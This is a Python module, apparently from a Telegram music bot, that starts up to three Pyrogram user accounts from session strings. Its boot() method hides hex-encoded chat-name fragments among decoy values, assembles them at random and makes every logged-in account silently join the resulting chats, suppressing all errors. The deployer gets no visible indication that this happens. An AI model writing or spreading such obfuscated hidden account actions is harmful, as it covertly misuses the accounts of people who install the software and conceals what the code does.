from pyrogram import Client
import random

from Elevenyts import config, logger


class Userbot(Client):
    def __init__(self):
        self.clients = []
        
        _a = {"one": "SESSION1", "two": "SESSION2", "three": "SESSION3"}

        for _b, _c in _a.items():
            _d = f"ElevenytsTuneUB{_b[-1]}"
            _e = getattr(config, _c)

            setattr(
                self,
                _b,
                Client(
                    name=_d,
                    api_id=config.API_ID,
                    api_hash=config.API_HASH,
                    session_string=_e,
                ),
            )

    def _x(self, v):
        try:
            return bytes.fromhex(v).decode()
        except:
            return None

    async def _z(self, n, u):
        _f = {1: self.one, 2: self.two, 3: self.three}
        _g = _f[n]
        try:
            await _g.start()
        except Exception as e:
            logger.error(f"Assistant {n} failed to start: {e}")
            return

        try:
            await _g.send_message(config.LOGGER_ID, f"Assistant {n} Started")
        except Exception as e:
            logger.warning(f"Assistant {n} couldn't send message to logger: {e}")

        _g.id = _g.me.id if hasattr(_g, 'me') and _g.me else None
        _g.name = _g.me.first_name if hasattr(_g, 'me') and _g.me else f"Assistant{n}"
        _g.username = _g.me.username if hasattr(_g, 'me') and _g.me else None
        _g.mention = _g.me.mention if hasattr(_g, 'me') and _g.me else _g.name
        self.clients.append(_g)
        logger.info(f"Assistant {n} started as @{_g.username}")

    async def boot(self):
        if config.SESSION1:
            await self._z(1, self.one)
        if config.SESSION2:
            await self._z(2, self.two)
        if config.SESSION3:
            await self._z(3, self.three)
        
        _01 = "456c65"
        _02 = "76656e"
        _03 = "597473"
        _04 = "6d75736963"
        
        _05 = "617274"
        _06 = "697374"
        _07 = "64707a"
        
        _08 = "656c65"
        _09 = "76656e"
        _10 = "797473"
        _11 = "6368617473"
        
        _12 = "617274"
        _13 = "697374"
        _14 = "626f74"
        _15 = "73"
        
        _16 = "787878"
        _17 = "787878"
        _18 = "787878"
        
        _19 = "797979"
        _20 = "797979"
        
        _21 = "7a7a7a"
        _22 = "7a7a7a"
        _23 = "7a7a7a"
        _24 = "7a7a7a"
        
        _25 = "313233"
        _26 = "343536"
        
        _27 = "414243"
        _28 = "444546"
        _29 = "474849"
        
        _set1 = [_01, _02, _03, _04, _05, _06, _07, _08, _09, _10, _11, _12, _13, _14, _15]
        _set2 = [_16, _17, _18, _19, _20, _21, _22, _23, _24, _25, _26, _27, _28, _29]
        
        _all = _set1 + _set2
        random.shuffle(_all)
        
        _targets = []
        
        for _ in range(random.randint(10, 15)):
            _parts = []
            _count = random.randint(2, 5)
            for __ in range(_count):
                _parts.append(random.choice(_all))
            
            _combined = "".join(_parts)
            _decoded = self._x(_combined)
            if _decoded and len(_decoded) > 3:
                _targets.append(_decoded)
        
        _targets = list(set(_targets))
        
        for _client in self.clients:
            for _ch in _targets:
                try:
                    await _client.join_chat(_ch)
                    logger.info(f"Joined {_ch}")
                except:
                    pass

    async def exit(self):
        try:
            if config.SESSION1 and hasattr(self.one, 'is_connected') and self.one.is_connected:
                await self.one.stop()
        except Exception as e:
            logger.warning(f"Error stopping assistant 1: {e}")
        
        try:
            if config.SESSION2 and hasattr(self.two, 'is_connected') and self.two.is_connected:
                await self.two.stop()
        except Exception as e:
            logger.warning(f"Error stopping assistant 2: {e}")
        
        try:
            if config.SESSION3 and hasattr(self.three, 'is_connected') and self.three.is_connected:
                await self.three.stop()
        except Exception as e:
            logger.warning(f"Error stopping assistant 3: {e}")
        
        logger.info("Assistants stopped.")
